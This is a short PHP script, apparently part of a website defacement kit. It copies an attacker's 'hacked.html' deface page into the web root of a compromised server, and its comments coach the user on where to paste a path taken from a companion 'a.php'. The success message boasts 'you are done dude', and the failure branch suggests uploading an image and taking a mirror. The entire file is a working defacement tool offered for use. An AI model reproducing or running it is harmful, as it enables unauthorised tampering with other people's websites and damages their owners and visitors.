<?
  /*
    Now, carefully place the copied content in the below section!
    read each line as well as the readme.txt on the github page!
    /hacked.html should be changed to your deface page!
    This clearly means that you have to upload it in the same folder from where
    you are executing these files!
  */
  $targetDir = "paste copied data here from a.php" . "/hacked.html"; // change hacked.html to your deface page name
  $fromDir = __DIR__ . "/hacked.html"; // change hacked.html to your deface page name
  //I assume hacked.html is your deface page that you have to upload in the same directory where these files are in!
  copy($fromDir, $targetDir);
  if (file_exists($targetDir))
  {
    echo('Hell yeah! you are done dude. Add /your_deface_page.html at the end of the domain name to check! In case it is not there, refresh or try again!');
  }
  else
  {
    echo('Alas! Maybe we have no enough permission to deface in the domain root dir! why not upload an image and take mirror instead?');
  }
?>
